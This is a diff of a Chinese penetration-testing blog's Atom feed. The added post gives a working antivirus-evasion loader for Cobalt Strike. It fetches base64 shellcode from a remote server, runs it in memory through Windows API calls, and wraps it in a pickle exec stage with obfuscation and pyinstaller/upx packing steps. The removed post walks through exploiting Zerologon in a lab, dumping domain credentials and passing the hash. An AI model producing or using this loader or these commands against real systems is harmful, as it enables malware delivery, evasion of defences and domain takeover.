@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://www.svenbeast.com</id>
     <title>攻城肾透shi | sv3nbeast</title>
-    <updated>2021-03-07T16:56:56.482Z</updated>
+    <updated>2021-03-09T15:45:36.525Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://www.svenbeast.com"/>
     <link rel="self" href="https://www.svenbeast.com/atom.xml"/>
@@ -10,6 +10,89 @@
     <logo>https://www.svenbeast.com/images/avatar.png</logo>
     <icon>https://www.svenbeast.com/favicon.ico</icon>
     <rights>All rights reserved 2021, 攻城肾透shi | sv3nbeast</rights>
+    <entry>
+        <title type="html"><![CDATA[bypassAV的CS上线]]></title>
+        <id>https://www.svenbeast.com/post/c5POOWPbA/</id>
+        <link href="https://www.svenbeast.com/post/c5POOWPbA/">
+        </link>
+        <updated>2021-03-09T15:40:57.000Z</updated>
+        <content type="html"><![CDATA[<p>CS生成c语言的payload，取其中的shellcode，base64加密后放入shellcode.txt，放入公网vps的web服务中</p>
+<p>shellcode=&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00'</p>
+<pre><code class="language-python">import ctypes,urllib.request,codecs,base64
+shellcode = urllib.request.urlopen('http://ip/shellcode.txt').read()
+shellcode = shellcode.strip()
+shellcode = base64.b64decode(shellcode)
+shellcode =codecs.escape_decode(shellcode)[0]
+shellcode = bytearray(shellcode)
+ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
+buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+ctypes.windll.kernel32.RtlMoveMemory(
+    ctypes.c_uint64(ptr), 
+    buf, 
+    ctypes.c_int(len(shellcode)))
+handle = ctypes.windll.kernel32.CreateThread(
+    ctypes.c_int(0), 
+    ctypes.c_int(0), 
+    ctypes.c_uint64(ptr), 
+    ctypes.c_int(0), 
+    ctypes.c_int(0), 
+    ctypes.pointer(ctypes.c_int(0))
+)
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
+</code></pre>
+<p>上面代码复制后base64加密，放入loder.txt文件放入公网vps的web服务中</p>
+<pre><code>import pickle
+import ctypes,urllib.request,codecs,base64
+sectr = urllib.request.urlopen('http://ip/loader.txt').read()
+sectr = base64.b64decode(sectr).decode(&quot;utf-8&quot;)
+class A(object):
+    def __reduce__(self):
+        return (exec, (sectr,))
+ret = pickle.dumps(A())
+ret_base64 = base64.b64encode(ret)
+ret_decode = base64.b64decode(ret_base64)
+pickle.loads(ret_decode)
+</code></pre>
+<p>上面代码改好vps的ip</p>
+<p>pyminifier --nonlatin --replacement-length=10 shellcode.py</p>
+<p>使用此命令进行混淆，更换代码，有没有这步都行，保险加上</p>
+<p>使用以下打包过程，目的是尽量压缩pyinstaller的单文件大小，效果明显，10m-&gt;6.多m ，仍然够大，但已经努力缩小了</p>
+<ul>
+<li>
+<p>pip3 install pipenv    //安装虚拟环境，为了压缩打包文件大小</p>
+</li>
+<li>
+<p>新建文件夹当做pipenv的目录，最好是根路径</p>
+</li>
+<li>
+<p>pipenv install</p>
+</li>
+<li>
+<p>pipenv shell</p>
+</li>
+<li>
+<p>pip3 install 安装木马需要的模块和pyinstaller</p>
+</li>
+<li>
+<p>同目录放入upx.exe</p>
+</li>
+<li>
+<p>pyinstaller -w -F --clean --key 8939usj8suxk2h3  -i ico.ico shellcode.py</p>
+</li>
+<li>
+<p>--key选项加不加都行，看个人喜好</p>
+</li>
+</ul>
+<p><strong>总结一下:</strong></p>
+<p>2021·3·09</p>
+<p>过火绒+360全家桶</p>
+<p>卡巴斯基免费版不行，静态可以，执行就杀，内存杀得东南西北都不认得了</p>
+<p>python+pyinstaller+upx+远程+混淆+无参，没有沙箱检测的代码，总感觉无参的可能存活时间不长，容易被360云沙箱标记，就看6m的大小360会不会自动上传吧</p>
+<figure data-type="image" tabindex="1"><img src="https://typora-1257617803.cos.ap-beijing.myqcloud.com/typora/20210309232931.gif" alt="shell" loading="lazy"></figure>
+<p>参考链接:https://blog.csdn.net/qq_40989258/article/details/113460218</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[NAT规则滥用导致的内网代理]]></title>
         <id>https://www.svenbeast.com/post/6_134ZiaS/</id>
@@ -1309,148 +1392,6 @@ for res in arr:
 <img src="https://www.svenbeast.com/post-images/1603102892602.png" alt="" loading="lazy"><br>
 <img src="https://www.svenbeast.com/post-images/1603102783683.png" alt="" loading="lazy"><br>
 然后用这个key生成序列化数据进行访问，得到flag</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2020-1472 NetLogon 特权提升漏洞 ]]></title>
-        <id>https://www.svenbeast.com/post/fu-xian-cve-2020-1472-netlogon-te-quan-ti-sheng-lou-dong/</id>
-        <link href="https://www.svenbeast.com/post/fu-xian-cve-2020-1472-netlogon-te-quan-ti-sheng-lou-dong/">
-        </link>
-        <updated>2020-09-17T15:07:33.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="0x01-漏洞详情">0x01 漏洞详情</h3>
-<pre><code>NetLogon组件 是 Windows 上一项重要的功能组件，用于用户和机器在域内网络上的认证，以及复制数据库以进行域控备份，同时还用于维护域成员与域之间、域与域控之间、域DC与跨域DC之间的关系。
-
-当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的易受攻击的 Netlogon 安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。
-</code></pre>
-<h3 id="0x02-影响版本">0x02 影响版本</h3>
-<pre><code>Windows Server 2008 R2 for x64-based Systems Service Pack 1
-Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
-Windows Server 2012
-Windows Server 2012 (Server Core installation)
-Windows Server 2012 R2
-Windows Server 2012 R2 (Server Core installation)
-Windows Server 2016
-Windows Server 2016 (Server Core installation)
-Windows Server 2019
-Windows Server 2019 (Server Core installation)
-Windows Server, version 1903 (Server Core installation)
-Windows Server, version 1909 (Server Core installation)
-Windows Server, version 2004 (Server Core installation)
-</code></pre>
-<h3 id="0x03-域环境搭建">0x03 域环境搭建</h3>
-<pre><code>靶机环境：https://pan.baidu.com/s/13nU-0vsGBnGejGCKzwphfQ&amp;shfl=sharepset     
-提取码：41y6
-
-DC  
-windows server 2012
-单网卡
-IP: 10.10.10.10  
-网关: 10.10.10.1
-
-PC
-windows 7
-双网卡
-IP: 10.10.10.201
-网关: 10.10.10.1
-IP: 172.21.139.173
-网关: 172.21.139.1
-
-WEB
-windows 2008
-双网卡
-IP:  10.10.10.80
-网关:  10.10.10.1
-IP:  172.21.139.41
-网关:  172.21.139.1
-
-Mac攻击机
-172.21.139.37
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1600356207906.png" alt="" loading="lazy"></figure>
-<h3 id="0x04-过程记录">0x04 过程记录</h3>
-<ul>
-<li>正向SOCKS5：将被攻击机器的流量代理到Mac攻击机中,Mac用proxychains4代理<br>
-(拿到一个入口点,把流量代理出去)</li>
-</ul>
-<pre><code>  ew_for_Win.exe -s ssocksd -l 8888
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1600356240721.png" alt="" loading="lazy"></figure>
-<ul>
-<li>定位域控IP</li>
-</ul>
-<pre><code>  net time /domain
-  ping  DC
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1600356991318.png" alt="" loading="lazy"></figure>
-<ul>
-<li>
-<p>检测域控是否存在此漏洞</p>
-<pre><code>  ./proxychains4 python3 zerologon_tester.py DC(域控名字) 10.10.10.10(域控IP)
-  返回Success,代表存在漏洞
-</code></pre>
-<figure data-type="image" tabindex="4"><img src="https://www.svenbeast.com/post-images/1600357588845.png" alt="" loading="lazy"></figure>
-</li>
-<li>
-<p>重置域控账户密码</p>
-<pre><code>./proxychains4 python3 cve-2020-1472-exploit.py  DC 10.10.10.10
-</code></pre>
-<figure data-type="image" tabindex="5"><img src="https://www.svenbeast.com/post-images/1600360388537.png" alt="" loading="lazy"></figure>
-</li>
-<li>
-<p>可进行操作1：此时域控密码为空，同等于已知密码，所以可以导出域内所有用户凭据</p>
-<pre><code>proxychains4 secretsdump.py test.local/dc\$@10.10.10.10 -no-pass
-proxychains4 secretsdump.py test.local/域控名字\$@10.10.10.10 -no-pass
-</code></pre>
-<figure data-type="image" tabindex="6"><img src="https://www.svenbeast.com/post-images/1600361080536.png" alt="" loading="lazy"></figure>
-</li>
-<li>
-<p>可进行操作2：获取域管理员名字，导出域管的hash</p>
-<pre><code>net group &quot;domain admins&quot;  /domain
-./proxychains4 secretsdump.py test.local/dc\$@10.10.10.10 -no-pass -just-dc | grep 'Administrator'
-</code></pre>
-<p><img src="https://www.svenbeast.com/post-images/1600362035651.png" alt="" loading="lazy"><br>
-<img src="https://www.svenbeast.com/post-images/1600362065199.png" alt="" loading="lazy"></p>
-</li>
-<li>
-<p>可进行操作3：已知域管hash，通过wmic 拿到域控制器中的本地管理员权限，nice~ (域管)</p>
-<pre><code>./proxychains4 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 test.local/Administrator@10.10.10.10
-</code></pre>
-<figure data-type="image" tabindex="7"><img src="https://www.svenbeast.com/post-images/1600362422752.png" alt="" loading="lazy"></figure>
-</li>
-<li>
-<p>恢复域控密码：已经通过wmic拿到域控本地管理员权限时，开始导出sam数据库中原来的计算机hash</p>
-<pre><code>reg save HKLM\SYSTEM system.save
-reg save HKLM\SAM sam.save
-reg save HKLM\SECURITY security.save
-get system.save
-get sam.save
-get security.save
-del /f system.save
-del /f sam.save
-del /f security.save
-</code></pre>
-<figure data-type="image" tabindex="8"><img src="https://www.svenbeast.com/post-images/1600363234006.png" alt="" loading="lazy"></figure>
-<pre><code>利用导出的sam数据库，提取出机器账号的明文hex
-./proxychains4 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
-</code></pre>
-<figure data-type="image" tabindex="9"><img src="https://www.svenbeast.com/post-images/1600363602661.png" alt="" loading="lazy"></figure>
-<pre><code>利用提取的明文hex，进行最后的恢复操作
-./proxychains4 python3 restorepassword.py DC@DC -target-ip 10.10.10.10 -hexpass 6b69e91c1675c3f849e7ac70f4baf81782df5336244b75c9fd08c6ab02b0ed1c434ce5bbf3d7f260f02e5b8e4e817e7fa64eb8337bac67577c902b04334816f3e329d2817d9508398b405d47a81651b444e3c7f34b6be3804ad5ff950e9dcb40008e190a8c819c75300a3dee8a3c4b5a19b488725d9234e3fe7462f84660fe02fe3d0ee63e303fed23f970369ec3b870669edc578980f0630066f5df8853c2e63dd190169861d68ff1b36a0b3d6020fa61d1bd951851a8ea74fbe63675e3d52aee12385f8405b01d4d1d4d7ed151d44d3043d13636964666d29dbe48ac74a0c33cba2c506a3f01689ba2d667b38dcc98
-</code></pre>
-<p><img src="https://www.svenbeast.com/post-images/1600363893799.png" alt="" loading="lazy"><br>
-<strong>PS: 恢复后的hash经过检查，完整恢复，和漏洞利用前的hash是一样的</strong></p>
-</li>
-</ul>
-<h3 id="0x04-坑点">0x04 坑点</h3>
-<ul>
-<li>exp运行中会因为impacket报错，重新安装此模块即可<pre><code>git clone https://github.com/SecureAuthCorp/impacket.git
-cd impacket &amp;&amp; pip3 install .
-</code></pre>
-</li>
-<li>一些脚本是impacket模块里面的py文件</li>
-<li>exp的一些参数，最好搞清楚对应域的那些东西</li>
-<li>图片很多，环境麻烦，能挤出时间真不容易。</li>
-</ul>
 ]]></content>
     </entry>
 </feed>
